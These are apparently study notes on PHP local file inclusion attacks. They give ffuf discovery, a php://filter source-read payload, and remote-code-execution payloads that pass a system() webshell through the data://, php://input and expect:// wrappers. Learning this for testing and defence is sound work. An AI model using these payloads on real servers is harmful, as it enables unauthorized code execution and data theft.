# Local file inclusion
## PHP filter

The interesting part, is to find first the php files with ffuf

    ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

after that we can try to retrieve the code using the filters.

    php://filter/read=convert.base64-encode/resource=config


## PHP wrappers
### DATA

the data wrapper is what allows to include external data, including php code, and it can allow us to have an RCE.

first we check the php configurations:

Nginx `/etc/php/X.Y/fpm/php.ini`

Apache `/etc/php/X.Y/apache2/php.ini`

and we check for the parameter `allow_url_include` it has to be on in order to include php code as follows:

    echo '<?php system($_GET["cmd"]); ?>' | base64

    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

### input

Similar to data, the only difference that the server needs to accept POST requests.

    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
           
## Expect

Finally we have the expect, which allows us to run commands directly as follows :

    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
